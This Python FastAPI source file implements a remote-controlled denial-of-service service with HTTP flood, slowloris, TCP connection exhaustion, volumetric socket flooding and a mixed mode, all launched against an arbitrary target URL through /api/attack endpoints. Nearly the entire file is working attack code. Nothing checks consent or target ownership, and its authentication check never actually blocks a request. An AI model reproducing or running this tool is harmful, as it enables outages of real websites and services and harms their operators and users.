import os
import time
import logging
import multiprocessing
import socket
import requests
from fastapi import FastAPI, HTTPException, Header, Depends
from pydantic import BaseModel
from typing import Optional
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.middleware.cors import CORSMiddleware
from datetime import datetime
import json

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Security
security = HTTPBearer()

# FastAPI app
app = FastAPI()

# Allow CORS for Next.js
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# In-memory store for attack processes and stats
attack_processes = {}
attack_stats = {}
attack_logs = {}

# Models
class AttackConfig(BaseModel):
    target_url: str
    duration: int  # in seconds
    intensity: int  # 1-5 scale
    concurrent_connections: int
    attack_type: str  # http_flood, slowloris, tcp_exhaustion, volumetric, mixed

class AttackStats(BaseModel):
    requests_sent: int
    connections_open: int
    bytes_sent: int
    errors: int
    start_time: datetime
    complete: bool

# Helper functions
def authenticate(credentials: HTTPAuthorizationCredentials = Depends(security)) -> bool:
    # Replace with your actual authentication logic
    token = credentials.credentials
    if token == os.getenv("API_SECRET_KEY"):
        return True
    return False

# Health check endpoint
@app.get("/health")
async def health_check():
    return {"status": "ok", "message": "Service is running"}

# Attack implementations
def http_flood(target_url: str, duration: int, intensity: int, concurrent_connections: int):
    start_time = time.time()
    requests_sent = 0
    errors = 0
    while time.time() - start_time < duration:
        try:
            requests.get(target_url, headers={"User-Agent": "DDoS-Test"})
            requests_sent += 1
        except Exception as e:
            errors += 1
            logger.error(f"HTTP Flood Error: {e}")
    return {"requests_sent": requests_sent, "errors": errors}

def slowloris(target_url: str, duration: int, intensity: int, concurrent_connections: int):
    start_time = time.time()
    sockets = []
    errors = 0
    try:
        host = target_url.split("://")[1].split("/")[0]
        for _ in range(concurrent_connections):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, 80))
                s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
                sockets.append(s)
            except Exception as e:
                errors += 1
                logger.error(f"Slowloris Error: {e}")
        while time.time() - start_time < duration:
            time.sleep(1)  # Keep connections open
    finally:
        for s in sockets:
            s.close()
    return {"connections_open": len(sockets), "errors": errors}

def tcp_exhaustion(target_url: str, duration: int, intensity: int, concurrent_connections: int):
    start_time = time.time()
    sockets = []
    errors = 0
    try:
        host = target_url.split("://")[1].split("/")[0]
        for _ in range(concurrent_connections):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, 80))
                sockets.append(s)
            except Exception as e:
                errors += 1
                logger.error(f"TCP Exhaustion Error: {e}")
        while time.time() - start_time < duration:
            time.sleep(1)  # Keep connections open
    finally:
        for s in sockets:
            s.close()
    return {"connections_open": len(sockets), "errors": errors}

def volumetric(target_url: str, duration: int, intensity: int, concurrent_connections: int):
    start_time = time.time()
    bytes_sent = 0
    errors = 0
    while time.time() - start_time < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_url.split("://")[1].split("/")[0], 80))
            payload = b"0" * (1024 * 1024)  # 1 MB payload
            s.send(payload)
            bytes_sent += len(payload)
            s.close()
        except Exception as e:
            errors += 1
            logger.error(f"Volumetric Error: {e}")
    return {"bytes_sent": bytes_sent, "errors": errors}

def mixed(target_url: str, duration: int, intensity: int, concurrent_connections: int):
    http_flood_stats = http_flood(target_url, duration, intensity, concurrent_connections)
    slowloris_stats = slowloris(target_url, duration, intensity, concurrent_connections)
    tcp_stats = tcp_exhaustion(target_url, duration, intensity, concurrent_connections)
    volumetric_stats = volumetric(target_url, duration, intensity, concurrent_connections)
    return {
        "http_flood": http_flood_stats,
        "slowloris": slowloris_stats,
        "tcp_exhaustion": tcp_stats,
        "volumetric": volumetric_stats,
    }

# Attack dispatcher
def execute_attack(config: AttackConfig):
    attack_func = {
        "http_flood": http_flood,
        "slowloris": slowloris,
        "tcp_exhaustion": tcp_exhaustion,
        "volumetric": volumetric,
        "mixed": mixed,
    }.get(config.attack_type, http_flood)
    return attack_func(config.target_url, config.duration, config.intensity, config.concurrent_connections)

# API Endpoints
@app.post("/api/attack/start", dependencies=[Depends(authenticate)])
async def start_attack(config: AttackConfig):
    attack_id = str(len(attack_processes) + 1)
    process = multiprocessing.Process(target=execute_attack, args=(config,))
    process.start()
    attack_processes[attack_id] = process
    attack_stats[attack_id] = AttackStats(requests_sent=0, connections_open=0, bytes_sent=0, errors=0, start_time=datetime.now(), complete=False)
    attack_logs[attack_id] = []
    logger.info(f"Started attack {attack_id} with config {config}")
    return {"attack_id": attack_id}

@app.get("/api/attack/{attack_id}/stop", dependencies=[Depends(authenticate)])
async def stop_attack(attack_id: str):
    if attack_id in attack_processes:
        attack_processes[attack_id].terminate()
        del attack_processes[attack_id]
        logger.info(f"Stopped attack {attack_id}")
        attack_stats[attack_id].complete = True
        return {"status": "stopped"}
    else:
        raise HTTPException(status_code=404, detail="Attack not found")

@app.get("/api/attack/{attack_id}/logs", dependencies=[Depends(authenticate)])
async def get_logs(attack_id: str):
    if attack_id in attack_logs:
        return {"logs": attack_logs[attack_id]}
    else:
        raise HTTPException(status_code=404, detail="Attack not found")

@app.get("/api/attack/{attack_id}/stats", dependencies=[Depends(authenticate)])
async def get_stats(attack_id: str):
    if attack_id in attack_stats:
        return {"stats": attack_stats[attack_id]}
    else:
        raise HTTPException(status_code=404, detail="Attack not found")

@app.get("/api/attack/{attack_id}/stats/realtime", dependencies=[Depends(authenticate)])
async def get_realtime_stats(attack_id: str):
    if attack_id in attack_stats:
        return {"stats": attack_stats[attack_id]}
    else:
        raise HTTPException(status_code=404, detail="Attack not found")

# To run the app
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
